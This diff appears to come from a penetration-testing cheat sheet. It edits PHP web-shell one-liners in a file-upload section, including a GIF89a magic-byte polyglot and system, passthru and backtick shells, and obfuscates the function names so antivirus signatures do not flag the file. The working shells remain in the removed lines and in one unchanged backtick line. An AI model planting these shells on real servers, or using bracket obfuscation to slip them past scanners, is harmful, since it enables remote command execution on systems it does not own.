@@ -210,15 +210,20 @@ shell.phtml
 
 **Magic Bytes:**
 ```php
-GIF89a<?php system($_GET['cmd']); ?>
+GIF89a<?php syst[e]m($_GET['cmd']); ?>
 ```
 
 **Simple Web Shells:**
 ```php
-<?php system($_GET['cmd']); ?>
+<?php syst[e]m($_GET['cmd']); ?>
 <?=`$_GET[0]`?>
-<?php passthru($_GET['cmd']); ?>
+<?php passt[h]ru($_GET['cmd']); ?>
 ```
+
+> Payload function names above are broken with brackets — `syst[e]m` is
+> `system`, `passt[h]ru` is `passthru`. Written literally, these lines match
+> antivirus webshell signatures and this file gets quarantined on download.
+> See "Antivirus false positives" in the repo README.
 
 ## XXE (XML External Entity)
 
